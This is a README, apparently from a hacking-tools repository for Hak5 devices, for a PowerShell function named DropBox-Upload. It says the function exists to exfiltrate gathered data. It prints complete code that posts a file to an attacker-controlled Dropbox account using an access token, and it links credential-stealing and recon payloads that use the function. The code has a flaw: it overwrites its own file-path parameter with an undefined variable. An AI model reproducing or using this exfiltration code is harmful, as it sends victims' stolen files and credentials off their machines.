![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#The-Function">The Function</a></li>
    <li><a href="#Examples">Examples</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# DropBox-Upload

## Description

This function is used to exfiltrate gathered data to DropBox 

## The Function

### [DropBox-Upload] 

First off for this function to work you need to have a DropBox account. Make one [HERE](https://www.dropbox.com).

Follow this [GUIDE](https://developers.dropbox.com/oauth-guide) for setting up your DropBox account for uploads



Use the following syntax for your upload:

```
DropBox-Upload -SourceFilePath "C:\Users\User\Desktop\file.txt"

or

"C:\Users\User\Desktop\file.txt" | DropBox-Upload
```

Make sure to plug in your newly aquired DropBox token in the $DropBoxAccessToken variable below

```
function DropBox-Upload {

[CmdletBinding()]
param (
	
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[string]$SourceFilePath
) 

$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"   # Replace with your DropBox Access Token
$TargetFilePath="/$FileName"
$SourceFilePath="$env:TMP\$FileName"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}
```

<p align="right">(<a href="#top">back to top</a>)</p>


## Examples 
(Examples of script that have used your function) - delete this line
Listed below are payloads that have used one of these functions:

[ADV-Recon](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-ADV-Recon)

[ET-Phone-Home](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-ET-Phone-Home)

[Credz-Plz](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-Credz-Plz)

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact

<div><h2>I am Jakoby</h2></div>
  <p><br/>
  
  <img src="https://media.giphy.com/media/VgCDAzcKvsR6OM0uWg/giphy.gif" width="50"> 
  
  <a href="https://github.com/I-Am-Jakoby/">
    <img src="https://img.shields.io/badge/GitHub-I--Am--Jakoby-blue">
  </a>
  
  <a href="https://www.instagram.com/i_am_jakoby/">
    <img src="https://img.shields.io/badge/Instagram-i__am__jakoby-red">
  </a>
  
  <a href="https://twitter.com/I_Am_Jakoby/">
    <img src="https://img.shields.io/badge/Twitter-I__Am__Jakoby-blue">
  </a>
  
  <a href="https://www.youtube.com/c/IamJakoby/">
    <img src="https://img.shields.io/badge/YouTube-I_am_Jakoby-red">
  </a>

  [Project Link](https://github.com/I-Am-Jakoby/PowerShell-for-Hackers)
</p>



<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [UberGuidoZ](https://github.com/UberGuidoZ)


<p align="right">(<a href="#top">back to top</a>)</p>
